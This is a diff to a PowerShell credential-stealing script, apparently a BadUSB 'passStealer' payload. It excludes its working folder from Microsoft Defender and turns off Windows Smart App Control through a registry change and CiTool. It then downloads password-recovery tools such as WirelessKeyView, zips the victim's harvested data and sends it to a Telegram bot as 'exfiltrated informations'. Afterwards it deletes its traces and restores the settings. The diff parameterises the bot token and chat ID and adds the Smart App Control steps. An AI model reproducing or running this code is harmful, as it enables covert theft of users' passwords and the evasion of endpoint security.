@@ -5,6 +5,17 @@
 #  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
 #  |___/                                        
 
+[CmdletBinding()]
+param(
+    [Parameter(Mandatory = $true)]
+    [ValidateScript({ -not [string]::IsNullOrWhiteSpace($_) })]
+    [string]$Token,
+
+    [Parameter(Mandatory = $true)]
+    [ValidateScript({ -not [string]::IsNullOrWhiteSpace($_) })]
+    [string]$ChatID
+)
+
 $basePath = "C:\Users\Public\Documents\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $dumpFile = "$dumpFolder.zip"
@@ -14,6 +25,13 @@ New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 Set-Location $basePath
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 Add-MpPreference -ExclusionPath $basePath -Force
+Set-ItemProperty `
+  -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" `
+  -Name "VerifiedAndReputablePolicyState" `
+  -Type DWord `
+  -Value 0
+
+CiTool --refresh --json
 
 # Download necessary tools
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
@@ -44,9 +62,7 @@ while (!(Test-Path "$dumpFile")) {
 }
 
 # Telegram configuration
-$token = "<TOKEN>"
-$chatID = "<CHATID>"
-$uri = "https://api.telegram.org/bot$token/sendDocument"
+$uri = "https://api.telegram.org/bot$Token/sendDocument"
 $caption = "Here are exfiltrated informations from $env:USERNAME"
 
 # Check if the file exists before sending
@@ -67,7 +83,7 @@ if (-not ("System.Net.Http.HttpClient" -as [type])) {
 # Create HTTP client
 $client = New-Object System.Net.Http.HttpClient
 $content = New-Object System.Net.Http.MultipartFormDataContent
-$content.Add((New-Object System.Net.Http.StringContent($chatID)), "chat_id")
+$content.Add((New-Object System.Net.Http.StringContent($ChatID)), "chat_id")
 $content.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
 
 # Attach the ZIP file
@@ -89,6 +105,13 @@ $fileStream.Dispose()
 Set-Location C:\Users\Public\Documents
 Remove-Item -Recurse -Force scripts
 Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
+Set-ItemProperty `
+  -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" `
+  -Name "VerifiedAndReputablePolicyState" `
+  -Type DWord `
+  -Value 1
+
+CiTool --refresh --json
 
 # Caps Lock signal
 $keyBoardObject = New-Object -ComObject WScript.Shell
